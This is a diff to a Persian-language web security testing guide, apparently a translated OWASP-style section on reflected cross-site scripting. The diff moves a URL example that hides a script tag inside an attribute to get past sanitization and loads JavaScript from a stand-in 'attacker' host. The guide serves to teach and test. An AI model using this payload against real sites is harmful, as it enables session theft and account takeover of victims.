@@ -195,6 +195,12 @@ echo "Welcome ".$_GET['var']." !";
 
 
 این امر برای فیلتر کردن عباراتی که داخل تگ اسکریپت قرار داده می شوند مفید است. اما در این حالت، می‌توان با استفاده از کاراکتر در یک Attribute بین scritp و src مانند زیر، Sanitization را دور زد:
+<div dir="ltr">
+
+```
+http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
+```
+<div dir="rtl">
 
 این کار آسیب‌پذیری Reflected XSS که قبلا نشان‌داده‌شده بود را اکسپلویت می کند و از اجرای کد JavaScript ذخیره‌شده در وب سرور مهاجم را طوری اجرا می‌کند که گویی از وب‌سایت قربانی، سرچشمه می‌گیرد.
 
@@ -206,7 +212,8 @@ echo "Welcome ".$_GET['var']." !";
 <div dir="ltr">
 
 ```
-http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
+http://example/page.php?param=<script>[...]</script>
+
 ```
 <div dir="rtl">
 
